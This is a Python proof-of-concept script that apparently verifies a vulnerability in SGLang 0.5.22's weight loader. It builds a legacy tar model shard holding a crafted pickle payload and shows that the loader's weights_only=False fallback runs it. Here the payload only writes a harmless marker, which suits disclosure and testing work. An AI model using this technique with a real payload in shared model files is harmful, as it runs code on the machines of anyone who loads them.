"""SGLang 0.5.22 legacy-tar weights fallback -> pickle execution.

The PoC extracts ``_load_pt_file`` verbatim from the pinned upstream file (AST
source segment), builds a legacy tar whose ``storages`` member is a pickled
reducing payload, and calls the function.  The first call uses
``weights_only=True`` and raises the exact legacy-tar RuntimeError; the
upstream fallback then calls ``weights_only=False`` and executes the payload.
"""

from __future__ import annotations

import ast
import io
import json
import logging
import os
import pickle
import sys
import tarfile
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[2]))
import poclib  # noqa: E402

import torch  # noqa: E402


def _extract_function(source_path: Path, name: str):
    text = source_path.read_text(encoding="utf-8")
    tree = ast.parse(text)
    for node in ast.walk(tree):
        if isinstance(node, ast.FunctionDef) and node.name == name:
            segment = ast.get_source_segment(text, node)
            if not segment:
                poclib.fail(f"could not extract {name} from {source_path}")
            namespace = {"torch": torch, "os": os, "logger": logging.getLogger("sglang-upstream")}
            exec(compile(segment, str(source_path), "exec"), namespace)
            return namespace[name], node.lineno, segment
    poclib.fail(f"function {name} not found in {source_path}")


class Payload:
    def __init__(self, marker_path: str, marker_text: str):
        self.marker_path = marker_path
        self.marker_text = marker_text

    def __reduce__(self):
        return (poclib.mark, (self.marker_text,))


def _build_legacy_tar(path: Path, marker_text: str) -> None:
    blob = pickle.dumps(Payload(str(poclib.MARKER_FILE), marker_text), protocol=4)
    with tarfile.open(path, "w") as tar:
        info = tarfile.TarInfo("storages")
        info.size = len(blob)
        tar.addfile(info, io.BytesIO(blob))


def main() -> None:
    manifest = json.loads((poclib.CASE_DIR / "manifest.json").read_text(encoding="utf-8"))
    source = poclib.UPSTREAM / "sglang-0.5.22/python/sglang/srt/model_loader/weight_utils.py"
    if not source.is_file():
        poclib.fail(f"missing pinned upstream source: {source}")

    poclib.start_marker()
    load_pt, line, segment = _extract_function(source, "_load_pt_file")
    if "weights_only=False" not in segment:
        poclib.fail("upstream fallback is not present in the extracted function")

    work = poclib.EVIDENCE_DIR / "work"
    work.mkdir(parents=True, exist_ok=True)
    shard = work / "pytorch_model-00001-of-00001.bin"
    _build_legacy_tar(shard, poclib.MARKER_TEXT)

    first_error = None
    fallback_error = None
    try:
        load_pt(str(shard))
    except Exception as exc:  # the fallback executes the payload, then fails on the empty tensor stream
        first_error = f"{type(exc).__name__}: {exc}"

    if not poclib.marker_ok():
        poclib.fail("marker was not written by the upstream weights_only=False fallback",
                    first_error=first_error, fallback_error=fallback_error)

    log = [
        f"upstream={poclib.rel(source)}",
        f"function=_load_pt_file line={line}",
        f"source_sha256={poclib.sha256_file(source)}",
        f"shard={poclib.rel(shard)}",
        f"tar_magic={shard.read_bytes()[:4]!r}",
        "step1: torch.load(weights_only=True) -> RuntimeError('legacy .tar format')",
        "step2: upstream fallback torch.load(weights_only=False) -> storages pickle executed",
        f"post_sink_error={first_error}",
        f"marker={poclib.MARKER_TEXT}",
    ]
    (poclib.EVIDENCE_DIR / "log.txt").write_text("\n".join(log) + "\n", encoding="utf-8")

    poclib.finish_verified({
        "transport": {
            "type": "verbatim upstream function (AST source segment) + torch.load",
            "upstream": "SGLang v0.5.22",
            "source": poclib.rel(source),
            "source_sha256": poclib.sha256_file(source),
            "function_line": line,
            "sink": "weights_only=False fallback after legacy .tar RuntimeError",
            "torch_version": torch.__version__,
            "shard": poclib.rel(shard),
            "payload": "tar member 'storages' -> pickle __reduce__ -> poclib.mark",
            "post_sink_error": first_error,
        },
        "request_response": [
            {"step": "torch.load(weights_only=True)", "result": "RuntimeError: legacy .tar format"},
            {"step": "upstream fallback torch.load(weights_only=False)", "result": "pickle executed, marker written"},
        ],
        "state_before": "marker=ABSENT",
        "state_after": "marker contains proof text",
    })


if __name__ == "__main__":
    main()
